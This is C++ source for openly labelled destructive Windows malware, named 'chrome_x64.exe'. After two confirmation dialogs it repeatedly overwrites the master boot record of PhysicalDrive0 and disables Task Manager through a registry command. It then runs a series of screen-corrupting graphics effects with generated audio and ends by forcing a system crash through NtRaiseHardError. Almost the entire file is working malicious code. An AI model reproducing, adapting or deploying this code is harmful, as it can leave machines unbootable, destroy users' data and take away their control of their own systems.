//warning: this is a dangerous malware!
#include <windows.h>
#include "bootrec.h"
#include <cstdlib>
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static ULONGLONG n, r;

#pragma comment(lib, "winmm.lib")

int randy() {
    return n = r,
    n ^= 0x8ebf635bee3c6d25,
    n ^= n << 5 | n >> 26,
    n *= 0xf3e05ca5c43e376b,
    r = n,
    n & 0x7fffffff;
}

DWORD WINAPI shader1(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % w;
        BitBlt(hdc, x, 1, 10, h, hdc, x, 0, NOTSRCCOPY);
        Sleep(2);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        StretchBlt(hdc, -10, -10, x + 20, y + 20, hdc, 0, 0, x, y, SRCCOPY);
        StretchBlt(hdc, 10, 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader5(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader6(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
         HDC hdc = GetDC(0);
         HDC hdcdc = CreateCompatibleDC(hdc);
         HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
         SelectObject(hdcdc, hbm);
         BitBlt(hdcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
         GetBitmapBits(hbm, 4 * h * w, data);
         int v = 0;
         BYTE byte = 0;
         if ((GetTickCount() - time) > 10) byte = randy() % 0xFF;
         for (int i = 0; w * h > i; i++) {
              if (i % h == 0 && randy() % 100 == 0) v = randy() % 25;
              ((BYTE*)(data + i + v))[v % 6] = ((BYTE*)(data + i))[v] ^ byte;
         }
         SetBitmapBits(hbm, w * h * 4, data);
         BitBlt(hdc, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
         DeleteObject(hbm);
         DeleteObject(hdcdc);
         DeleteObject(hdc);
    }
    return 0;
}

DWORD WINAPI shader7(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        StretchBlt(hdc, 0, -20, sw, sh + 40, hdc, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(4);
    }
}

DWORD WINAPI shader8(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int rx = rand() % w;
        BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>((t&t>>12)*(t>>4|t>>8));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(t>>(t&4096?t*t>>12:t>>12))|t<<(t>>8)|t>>4);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(3*((t>>1)+20)*t>>14*t>>18);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(t^t>>20*(t>>11)));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(9*(t*((t>>9|t>>13)&15)&16));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>((t-(t>>4&t>>8)&t>>12)-1);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*-(t>>8|t|t>>9|t>>13)^t);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(((t>>9^(t>>9)-1^1)%13*t&31)*(2+(t>>4)));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

DWORD WINAPI mbr(LPVOID lpParam) {
    while(1) {
        DWORD dwBytesWritten;
        HANDLE hDisk = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            0, OPEN_EXISTING, 0, 0
        );
        WriteFile(hDisk, MasterBootRecord, 32768, &dwBytesWritten, 0);
        CloseHandle(hDisk);
    }
}

DWORD WINAPI notaskmgr(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxW(NULL, L"This program you're running is considered malware\nDo you want to run this?", L"chrome_x64.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"Are you sure you want to run it?\nIt will overwrite your MBR.", L"chrome_x64.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, notaskmgr, 0, 0, 0);
            Sleep(4000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            Sleep(10);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            Sleep(10);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            Sleep(10);
            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            Sleep(10);
            HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            Sleep(10);
            HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            Sleep(10);
            HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            Sleep(10);
            HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
            sound8();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000146, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}